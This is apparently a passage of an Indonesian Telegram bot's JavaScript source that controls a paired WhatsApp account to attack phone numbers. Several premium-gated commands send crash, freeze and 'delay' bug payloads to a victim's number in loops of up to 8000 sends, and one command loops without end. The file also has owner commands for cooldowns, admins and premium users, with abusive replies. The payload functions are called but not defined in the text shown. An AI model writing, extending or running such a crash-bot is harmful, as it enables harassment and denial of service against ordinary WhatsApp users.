    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
    await NewiOs(sock, target);
    await iosinVisFC(sock, target, false);
    await CrashIos(sock, target);
    console.log(chalk.red.bold(`Sukses Sending Xinvis Sebanyak ${i + 1}/800 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
//case 2\\
bot.command("RzoFreeze", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example : /RzoFreeze 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\n Tunggu ${remainingTime} detik lagi`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sendding bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Successfully.
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 60; i++) {
    await HexzzCrashX(target);
    await DawGy(sock, target);
    await InVisibleX1(target, show);
    await ExTraKouta(target);
    await protocolbug5(isTarget, false);
    console.log(chalk.red.bold(`Sukses Sending Xinvis Sebanyak ${i + 1}/800 Ke ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 2 ===\\\\\\\
bot.command("RzoCrashIos", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Salah, Yang Bener: /RzoCrashIos 62xxxxx`);
  }

  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sending bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Processing...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }

  if (!isOwner(userId)) setGlobalCooldown();

  console.log(chalk.green(`[LOG] Memulai pengiriman bug ke ${target}`));
  for (let i = 0; i < 100; i++) {
    try {
      await NewiOs(sock, target);
      await iosinVisFC(sock, target, false);
      await CrashIos(sock, target);
      console.log(chalk.redBright(`Sukses kirim ${i + 1}/100 ke ${target}`));
      await new Promise((r) => setTimeout(r, 1000));
    } catch (err) {
      console.error(chalk.red(`❌ Gagal kirim ke ${target}: ${err.message}`));
      break;
    }
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== CASE BUG 3 ===\\\\\\\
///////==== CASE BUG 4 ===\\\\\\\
bot.command("RzoForce", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Salah, Yang Bener: /RzoForce 62xxxx`);

  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target: ${q}
▢ Status: Sending bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((r) => setTimeout(r, stage.delay));
    await ctx.editMessageCaption(
      `\`\`\`
▢ Target: ${q}
▢ Status: Sending...
${stage.text}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown"
      }
    );
  }

  if (!isOwner(userId)) setGlobalCooldown();

  console.log("\x1b[32m[PROSES BUG SEDANG BERLANGSUNG]\x1b[0m");

  for (let i = 0; i < 8000; i++) {
    try {
      await PayMsgFlowX(target);
      await delay5GB(sock, target, false);
      await delay(target);
      await KuotaHardXDelaySql(target, sock);
      await coreclose2(target);
      console.log(chalk.red.bold(`✅ Ke-${i + 1}/8000 bug terkirim ke ${target}`));
    } catch (err) {
      console.log(chalk.red(`❌ Error kirim ke ${target}:`, err.message));
    }
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  await ctx.editMessageCaption(
    `\`\`\`
▢ Target: ${q}
▢ Status: Done!
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]
        ]
      }
    }
  );
});
///////==== CASE BUG 5 ===\\\\\\\
// Fungsi untuk ubah nomor ke format JID
function jid(number) {
  number = number.replace(/\D/g, ""); // Hilangkan semua karakter non-digit
  return number + "@s.whatsapp.net"; // Tambahkan domain WhatsApp
}

// Command RzoDelay
bot.command("RzoDelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply(`Example : /RzoDelay <number>`);

  // Cek cooldown global untuk non-owner
  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remaining = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remaining} detik lagi`);
  }

  const target = jid(q); // Format JID

  // Kirim pesan awal progres
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `\`\`\`
▢ Target : ${q}
▢ Status : Sending bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``,
    parse_mode: "Markdown",
  });

  // Animasi progres
  const progress = [
    { bar: "[█░░░░░░░░░] 10%", delay: 200 },
    { bar: "[███░░░░░░░] 30%", delay: 200 },
    { bar: "[█████░░░░░] 50%", delay: 150 },
    { bar: "[███████░░░] 70%", delay: 100 },
    { bar: "[█████████░] 90%", delay: 100 },
    { bar: "[██████████] 100%\nSuccess sending bug!", delay: 200 },
  ];

  for (const stage of progress) {
    await new Promise((r) => setTimeout(r, stage.delay));
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
      `\`\`\`
▢ Target : ${q}
▢ Status : Progressing...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.bar}
\`\`\``,
      { parse_mode: "Markdown" });
  }

  // Set cooldown setelah kirim jika bukan owner
  if (!isOwner(userId)) setGlobalCooldown();

  // ⛔️ LOOP SPAM GACOR ⛔️
  for (let i = 0; i < 700; i++) {
    await delay(target);            // fungsi delay custom (pastikan sudah ada)
    await CrashGalaxy(target);      // fungsi spam bug ke target
    console.log(chalk.red.bold(`[${i + 1}/700] Sent Combo Bug to ${target}`));
    await new Promise((r) => setTimeout(r, 1000)); // jeda antar spam
  }

  // Kirim hasil akhir ke user
  await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
    `\`\`\`
▢ Target : ${q}
▢ Status : DONE!
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\``,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝘾𝙀𝙆 𝙏𝘼𝙍𝙂𝙀𝙏", url: `https://wa.me/${q.replace(/\D/g, "")}` }
        ]]
      }
    });
});
//Case bug twst
bot.command("crashch", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/crashch 1234567891011@Newsletter 628xxxx`);
    }

    let SockNumber = q.replace(/[^0-9]/g, '');

    let target = SockNumber + "@s.whatsapp.net";

    let ProsesSock = await ctx.reply(`Successfully✅`);

    for (let i = 0; i < 200; i++) {
      await crashNewsletter(target);
      await callNewsletter(target);    
    }

    await ctx.telegram.editMessageText(`
        ctx.chat.id,
        ProsesSock.message_id,
        undefined, 
┏━━━━━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${SockNumber}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
});

///////==== CASE BUG 6 ===\\\\\\\
bot.command("RzoInvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Example: /RzoInvis <number>`);
  }

  if (!isOwner(userId) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sabar Bang\nTunggu ${remainingTime} detik lagi`);
  }

  const target = q.replace(/\D/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `<blockquote>
▢ Target: ${q}
▢ Status: Sending bug...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
</blockquote>`,
    parse_mode: "HTML"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███░░░░░░░]30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████░░░░░]50%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [███████░░░]70%", delay: 150 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [█████████░]90%", delay: 150 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%\n𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 },
  ];

  for (const stage of progressStages) {
    await new Promise((r) => setTimeout(r, stage.delay));
    await ctx.editMessageCaption(
      `
<blockquote>
▢ Target: ${q}
▢ Status: Processing...
${stage.text}
</blockquote>`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
      }
    );
  }

  if (!isOwner(userId)) setGlobalCooldown();

  console.log(chalk.red(`⛓️ Mulai loop pengiriman ke: ${target}`));

  while (true) {
    try {
      await delay5GB(sock, target, false);
      await VanasixForce(target);
      console.log(chalk.redBright(`✅ Sent to ${target}`));
      await new Promise((r) => setTimeout(r, 1000)); // delay biar gak ke-ban
    } catch (err) {
      console.error("❌ Error saat mengirim:", err.message);
      break; // keluar loop kalau error
    }
  }

  await ctx.editMessageCaption(
    `
\`\`\`
▢ Target: ${q}
▢ Status: Done 100%
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████]100%
\`\`\``,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝙲𝙴𝙺 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${q}` }]],
      },
    }
  );
});
///////==== COMMAND OWNER ====\\\\\\\\\
bot.command("setjeda", checkOwner, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;


  if (!duration) {
    return ctx.reply(`example /setjeda 60s`);
  }

  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return ctx.reply(
      `/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});
///=== comand add admin ===\\\
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 7598130753"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});
bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukin ID Nya GOBLOK !!\nContohnya Gini Nyet: /addprem 7598130753"
    );
  }

  const userId = args[1];

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ Kelaz Bocah Pea ini ${userId} sudah memiliki status premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ Kelaz Bocah Pea ini ${userId} sudah memiliki status premium.`
  );
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789"
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Haha Mampus Lu ${userId} Di delprem etmin🗿.`);
});

//fungsi imglink
const imgLinks = [];

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();



  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❌ Masukin nomor ny, Example : /addsender <nomor_wa>"
    );
  }

  let phoneNumber = args[1].replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Santai Masih Aman!! Gass ajaa cik...");
  }

  let sentMessage;

  try {
    // LANGKAH 1: Kirim pesan awal
    sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
- Procces Pair...
☇ Number : ${phoneNumber}
</blockquote>`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });

    // LANGKAH 2: Ambil kode pairing
    const code = await sock.requestPairingCode(phoneNumber, "LALZZ123"); // CUSTOM PAIR DISINI MINIM 8 HURUF
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
<blockquote>
- Your Code Pair Bro. 
☇ Number : ${phoneNumber}
☇ Code  : ${formattedCode}
</blockquote>`,
      { parse_mode: "HTML" }
    );

    // LANGKAH 3: Tunggu koneksi WhatsApp
    let isConnected = true;

sock.ev.on("connection.update", async (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === "open" && !isConnected) {
    isConnected = true;
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
<blockquote>
- Updates Pair
☇ Number : ${phoneNumber}
☇ Status : Successfully
</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (connection === "close" && !isConnected) {
    const shouldReconnect =
      lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

    if (!shouldReconnect) {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        sentMessage.message_id,
        null,
        `
<blockuote>
- Updates Pair
☇ Nomor : ${phoneNumber}
☇ Status : Gagal tersambung
\`\`\``,
        { parse_mode: "HTML" }
      );
    }
  }
});


  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});

// Handler tombol close
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", checkOwner, async (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("♻️Session berhasil dihapus, Segera lakukan restart pada panel anda sebelum pairing kembali");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});

//Command Restart
bot.command("restart", checkOwner, async (ctx) => {
  await ctx.reply("Restarting...");
  setTimeout(() => {
    process.exit(0);
  }, 1000); // restart setelah 1 detik
});

/////===== CONST TAMBAHAN =====\\\\\


/////===== CASE FUNCTION =====\\\\\

// --- Jalankan Bot ---

(async () => {
  console.clear();
  console.log("🚀 Memulai sesi WhatsApp...");
  startSesi();

  console.log("Sukses connected");
  bot.launch();
  // Membersihkan konsol sebelum menampilkan pesan sukses
  console.clear();
  console.log(
    chalk.bold.white(`\n

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`)
  );
})();

